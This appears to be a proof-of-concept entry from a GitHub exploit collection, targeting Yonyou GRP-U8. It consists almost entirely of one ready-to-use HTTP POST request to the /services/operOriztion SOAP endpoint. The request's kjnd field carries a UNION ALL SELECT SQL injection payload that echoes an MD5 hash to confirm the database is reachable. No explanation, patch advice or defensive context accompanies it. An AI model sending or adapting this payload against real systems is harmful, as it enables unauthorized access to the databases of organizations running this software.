# grpu8_operOriztion_sqli

from: https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BGRP-U8-operOriztion%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

2024.4.22 @2

```
POST /services/operOriztion HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
<soapenv:Header/>
<soapenv:Body>
<wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<kjnd xsi:type="xsd:string">' UNION ALL SELECT sys.fn_sqlvarbasetostr(HashBytes('MD5','123456'))-- </kjnd>
</wsdd:getGsbmfaByKjnd>
</soapenv:Body>
</soapenv:Envelope>
```
